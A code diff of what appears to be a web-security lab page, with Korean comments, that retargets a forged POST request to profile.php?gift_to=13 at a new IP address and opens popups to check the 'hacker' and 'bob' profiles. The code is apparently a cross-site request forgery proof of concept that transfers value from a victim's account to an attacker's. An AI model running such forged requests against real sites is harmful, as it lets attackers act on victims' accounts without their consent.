@@ -211,7 +211,7 @@
                 
                 try {
                     // 실제 fetch 요청 (토큰 포함)
-                    const response = await fetch('http://3.36.66.216/profile.php?gift_to=13', {
+                    const response = await fetch('http://13.125.80.75/profile.php?gift_to=13', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/x-www-form-urlencoded',
@@ -268,11 +268,11 @@
             addLog('🔍 결과 확인 창 열기...', 'info');
             
             // hacker 프로필 확인
-            window.open('http://3.36.66.216/profile.php?user_id=13', 'hacker_check', 'width=800,height=600,left=100,top=100');
+            window.open('http://13.125.80.75/profile.php?user_id=13', 'hacker_check', 'width=800,height=600,left=100,top=100');
             
             // bob 프로필 확인 (선택사항)
             setTimeout(() => {
-                window.open('http://3.36.66.216/profile.php', 'bob_check', 'width=800,height=600,left=900,top=100');
+                window.open('http://13.125.80.75/profile.php', 'bob_check', 'width=800,height=600,left=900,top=100');
             }, 1000);
         }
         
